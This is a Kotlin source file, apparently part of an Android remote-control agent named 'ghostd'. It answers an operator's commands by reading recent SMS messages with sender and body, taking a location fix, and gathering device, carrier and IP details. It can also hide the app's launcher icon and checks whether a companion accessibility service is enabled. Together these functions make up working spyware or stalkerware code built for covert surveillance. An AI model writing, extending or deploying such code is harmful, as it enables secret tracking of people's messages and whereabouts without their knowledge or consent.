package com.tg.ghostd

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationManager
import android.os.BatteryManager
import android.os.Build
import android.os.Environment
import android.os.StatFs
import android.os.SystemClock
import android.provider.Settings
import android.telephony.TelephonyManager
import org.json.JSONArray
import org.json.JSONObject
import java.net.Inet4Address
import java.net.NetworkInterface
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Read-only device data: SMS inbox, location fix, device/build info, and the
 * launcher-icon visibility used by `hide` / `unhide`.
 *
 * Every call is defensive: missing permission or missing provider returns a
 * structured error instead of throwing, so the operator sees WHY a verb
 * failed on a given phone.
 */
object DataReaders {

    // ------------------------------------------------------------------- SMS

    /** `sms recent [N]` — newest [limit] messages, newest first. */
    fun smsRecent(ctx: Context, limit: Int): JSONObject {
        val n = limit.coerceIn(1, 200)
        val out = JSONArray()
        val uri = android.net.Uri.parse("content://sms")
        val cols = arrayOf("_id", "address", "body", "date", "type", "read")
        try {
            ctx.contentResolver.query(
                uri, cols, null, null, "date DESC LIMIT $n"
            )?.use { c ->
                val iId = c.getColumnIndex("_id")
                val iAddr = c.getColumnIndex("address")
                val iBody = c.getColumnIndex("body")
                val iDate = c.getColumnIndex("date")
                val iType = c.getColumnIndex("type")
                val iRead = c.getColumnIndex("read")
                while (c.moveToNext() && out.length() < n) {
                    out.put(
                        JSONObject()
                            .put("id", if (iId >= 0) c.getLong(iId) else -1)
                            .put("address", if (iAddr >= 0) c.getString(iAddr) ?: "" else "")
                            .put("body", if (iBody >= 0) c.getString(iBody) ?: "" else "")
                            .put("date", if (iDate >= 0) c.getLong(iDate) else 0L)
                            .put("type", if (iType >= 0) c.getInt(iType) else -1)
                            .put("read", if (iRead >= 0) c.getInt(iRead) != 0 else false)
                    )
                }
            }
        } catch (e: SecurityException) {
            return JSONObject().put("ok", false)
                .put("error", "READ_SMS not granted")
                .put("hint", "grant SMS permission in the setup wizard, then retry")
        } catch (e: Exception) {
            return JSONObject().put("ok", false).put("error", "sms query: ${e.message}")
        }
        return JSONObject().put("ok", true).put("count", out.length())
            .put("limit", n).put("messages", out)
    }

    // -------------------------------------------------------------- location

    /**
     * `loc once` — best available fix. Tries (in order) the last known fix
     * from every provider, then a single fresh request with a short timeout.
     * Returns ok=false with a reason when nothing is available (typically:
     * location permission denied, or location services switched off).
     */
    fun locationOnce(ctx: Context, timeoutMs: Long = 12_000L): JSONObject {
        val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            ?: return JSONObject().put("ok", false).put("error", "no LocationManager")
        val providers = try {
            lm.getProviders(true)
        } catch (e: Exception) {
            emptyList<String>()
        }
        var best: Location? = null
        for (p in providers) {
            try {
                val l = lm.getLastKnownLocation(p) ?: continue
                if (best == null || l.time > best!!.time) best = l
            } catch (_: SecurityException) {
                return JSONObject().put("ok", false)
                    .put("error", "location permission not granted")
            } catch (_: Exception) {
            }
        }
        val fresh = best != null &&
            System.currentTimeMillis() - best!!.time < 5 * 60_000L
        if (!fresh) {
            val got = requestSingleFix(lm, providers, timeoutMs)
            if (got != null && (best == null || got.time > best!!.time)) best = got
        }
        val loc = best
            ?: return JSONObject().put("ok", false)
                .put("error", "no fix available")
                .put("providers", JSONArray(providers))
                .put("hint", "enable location services / grant permission")
        return JSONObject().put("ok", true)
            .put("lat", loc.latitude)
            .put("lon", loc.longitude)
            .put("accuracy_m", loc.accuracy.toDouble())
            .put("provider", loc.provider ?: "?")
            .put("age_s", ((System.currentTimeMillis() - loc.time) / 1000).toInt())
            .put("altitude", if (loc.hasAltitude()) loc.altitude else JSONObject.NULL)
    }

    /** One blocking fix request across the available providers. */
    private fun requestSingleFix(
        lm: LocationManager, providers: List<String>, timeoutMs: Long
    ): Location? {
        if (providers.isEmpty()) return null
        val latch = CountDownLatch(1)
        var got: Location? = null
        val listener = object : android.location.LocationListener {
            override fun onLocationChanged(location: Location) {
                if (got == null) got = location
                while (latch.count > 0) latch.countDown()
            }

            // API 30+ replaces the deprecated callback; keep both signatures.
            override fun onProviderEnabled(provider: String) {}
            override fun onProviderDisabled(provider: String) {}
        }
        // Prefer network (fast, works indoors), then gps.
        val ordered = providers.sortedBy { if (it == LocationManager.NETWORK_PROVIDER) 0 else 1 }
        for (p in ordered) {
            try {
                @Suppress("DEPRECATION")
                lm.requestSingleUpdate(
                    p, listener, android.os.Looper.getMainLooper()
                )
            } catch (_: SecurityException) {
                return null
            } catch (_: Exception) {
            }
        }
        latch.await(timeoutMs, TimeUnit.MILLISECONDS)
        try {
            @Suppress("DEPRECATION")
            lm.removeUpdates(listener)
        } catch (_: Exception) {
        }
        return got
    }

    // ----------------------------------------------------------- device info

    /** `device info` — stable, human-readable facts for the operator. */
    fun deviceInfo(ctx: Context): JSONObject {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as? BatteryManager
        val battery = bm?.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
        val charging = bm?.isCharging ?: false
        val stat = StatFs(Environment.getDataDirectory().path)
        val freeMb = stat.availableBlocksLong * stat.blockSizeLong / (1024 * 1024)
        val totalMb = stat.blockCountLong * stat.blockSizeLong / (1024 * 1024)
        val dm = ctx.resources.displayMetrics
        val tm = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? TelephonyManager
        return JSONObject()
            .put("ok", true)
            .put("brand", Build.BRAND)
            .put("manufacturer", Build.MANUFACTURER)
            .put("model", Build.MODEL)
            .put("device", Build.DEVICE)
            .put("android", Build.VERSION.RELEASE)
            .put("sdk", Build.VERSION.SDK_INT)
            .put("battery", battery)
            .put("charging", charging)
            .put("screen", "${dm.widthPixels}x${dm.heightPixels}@${dm.densityDpi}dpi")
            .put("storage_free_mb", freeMb)
            .put("storage_total_mb", totalMb)
            .put("uptime_s", SystemClock.elapsedRealtime() / 1000)
            .put("ip", localIpv4())
            .put("carrier", try {
                tm?.networkOperatorName ?: ""
            } catch (_: Exception) {
                ""
            })
            .put("app_version", AppUpdater.currentVersionName(ctx))
            .put("sidekick_version", AppUpdater.installedVersionName(ctx, AppUpdater.SIDEKICK_PACKAGE))
            .put("icon_hidden", isHidden(ctx))
            .put("sidekick_accessibility", isSidekickAccessibilityOn(ctx))
    }

    // --------------------------------------------------------- hide / unhide

    /** Launcher icon state: the MAIN/LAUNCHER filter lives on MainAlias. */
    fun isHidden(ctx: Context): Boolean = try {
        ctx.packageManager.getComponentEnabledSetting(
            ComponentName(ctx, "${ctx.packageName}.MainAlias")
        ) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    } catch (_: Exception) {
        false
    }

    fun setHidden(ctx: Context, hidden: Boolean): JSONObject {
        ctx.packageManager.setComponentEnabledSetting(
            ComponentName(ctx, "${ctx.packageName}.MainAlias"),
            if (hidden) PackageManager.COMPONENT_ENABLED_STATE_DISABLED
            else PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        return JSONObject().put("ok", true).put("icon_hidden", isHidden(ctx))
    }

    // ---------------------------------------------------------------- status

    /** `status` — one-glance health of this device's agent. */
    fun status(ctx: Context): JSONObject {
        val info = deviceInfo(ctx)
        return JSONObject()
            .put("ok", true)
            .put("device_id", Prefs.deviceId(ctx))
            .put("app_version", info.optString("app_version"))
            .put("sidekick_version", info.opt("sidekick_version") ?: JSONObject.NULL)
            .put("sidekick_accessibility", info.optBoolean("sidekick_accessibility"))
            .put("icon_hidden", info.optBoolean("icon_hidden"))
            .put("battery", info.optInt("battery"))
            .put("ip", info.optString("ip"))
            .put("model", info.optString("model"))
            .put("unread_sms", unreadSmsCount(ctx))
    }

    private fun unreadSmsCount(ctx: Context): Int = try {
        ctx.contentResolver.query(
            android.net.Uri.parse("content://sms/inbox"),
            arrayOf("_id"), "read = 0", null, null
        )?.use { it.count } ?: -1
    } catch (_: Exception) {
        -1
    }

    private fun isSidekickAccessibilityOn(ctx: Context): Boolean = try {
        val enabled = Settings.Secure.getString(
            ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        enabled.contains(AppUpdater.SIDEKICK_PACKAGE)
    } catch (_: Exception) {
        false
    }

    private fun localIpv4(): String {
        try {
            for (nif in NetworkInterface.getNetworkInterfaces()) {
                if (!nif.isUp || nif.isLoopback) continue
                for (addr in nif.inetAddresses) {
                    if (addr is Inet4Address && !addr.isLoopbackAddress) {
                        return addr.hostAddress ?: ""
                    }
                }
            }
        } catch (_: Exception) {
        }
        return ""
    }
}
